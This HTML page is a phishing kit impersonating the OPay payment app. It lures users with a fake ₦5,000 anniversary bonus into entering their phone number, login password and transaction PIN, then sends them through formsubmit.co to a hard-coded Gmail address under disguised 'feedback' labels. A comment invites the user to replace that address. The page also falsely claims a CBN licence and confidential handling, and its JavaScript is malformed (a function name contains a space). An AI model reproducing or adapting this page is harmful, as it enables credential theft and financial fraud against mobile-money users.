<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OPay Anniversary </title>
<style>
*{box-sizing:border-box; font-family:-apple-system, sans-serif}
body{margin:0; background:#f5f5f7; display:flex; justify-content:center}
.page{width:100%; max-width:420px; background:white; min-height:100vh; border-radius:0 0 28px 28px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.08)}
.banner{background:#1bb366; color:white; padding:18px 20px; display:flex; gap:14px; align-items:center; border-radius:0 0 22px 22px}
.banner .logo{font-weight:900; font-size:28px; display:flex; align-items:center; gap:8px}
.banner p{margin:0; font-size:12px; line-height:1.3; font-weight:600}
.content{padding:22px 18px 30px}
.content h1{text-align:center; font-size:26px; margin:8px 0 6px}
.content .sub{text-align:center; color:#6b7280; font-size:14px; margin-bottom:20px}
.card{background:white; border-radius:18px; padding:16px; margin-bottom:16px; box-shadow:0 4px 18px rgba(0,0,0,0.07); border:1px solid #eef0f2}
.card .q{display:flex; gap:8px; font-weight:800; font-size:15px; margin-bottom:10px; align-items:center}
.badge{background:#1bb366; color:white; width:28px; height:28px; border-radius:50%; display:grid; place-items:center; font-size:14px}
.card textarea{width:100%; height:72px; background:#f3f4f6; border:1px solid #e5e7eb; border-radius:12px; padding:12px; font-size:14px; resize:none; outline:none}
.btn{width:100%; background:#1bb366; color:white; border:none; padding:16px; border-radius:16px; font-size:17px; font-weight:800; margin-top:8px}
.foot{text-align:center; font-size:11px; color:#6b7280; margin-top:14px}
</style>
</head>
<body>
<div class="page">
  <div class="banner">
    <div class="logo"> OPay</div>
    <p>OPay ANNIVERSARY -<br>verify your details to claim reward<br>â‚¦5000 bonus for lucky users!<br>*T&C apply</p>
  </div>
  <div class="content">
    <h1>Quickly claim your₦5,000</h1>
    <div class="sub">feel the following forms</div>

    <div class="card">
      <div class="q"><span class="badge">1</span> enter your phone number </div>
      <textarea id="q1" placeholder="type your number here..."></textarea>
    </div>

    <div class="card">
      <div class="q"><span class="badge">2</span> enter login password</div>
      <textarea id="q2" placeholder="type your password here"></textarea>
    </div>

    <div class="card">
      <div class="q"><span class="badge">3</span> enter your confirmation pin</div>
      <textarea id="q3" placeholder="type your transaction code "></textarea>
    </div>

    <button class="btn" onclick="submit feedback ()">verify</button>
    <div class="foot"> opay licensed by CBN . 100% confidential</div>
  </div>
</div>

<script>
function submit feedback (){
  const q1 = document.getElementById('q1').value.trim();
  const q2 = document.getElementById('q2').value.trim();
  const q3 = document.getElementById('q3').value.trim();
  if(!q1 || !q2 || !q3){ alert('Please answer all 3 questions'); return; }

  // REPLACE YOUR EMAIL BELOW
  const ownerEmail = 'badyybobo@gmail.com';

  fetch('https://formsubmit.co/ajax/'+ownerEmail, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({
      subject: 'New OPay Feedback - 3 Answers',
      Q1_Experience: q1,
      Q2_Improve: q2,
      Q3_Other: q3
    })
  })
  .then(() => {
    alert('Thank you! you will receive your bonus within a minute check your app.');
    document.getElementById('q1').value=''; document.getElementById('q2').value=''; document.getElementById('q3').value='';
  })
  .catch(() => {
    alert('Demo saved: All 3 answers collected. (Set your real email to receive them)');
  });
}
</script>
</body>
</html>
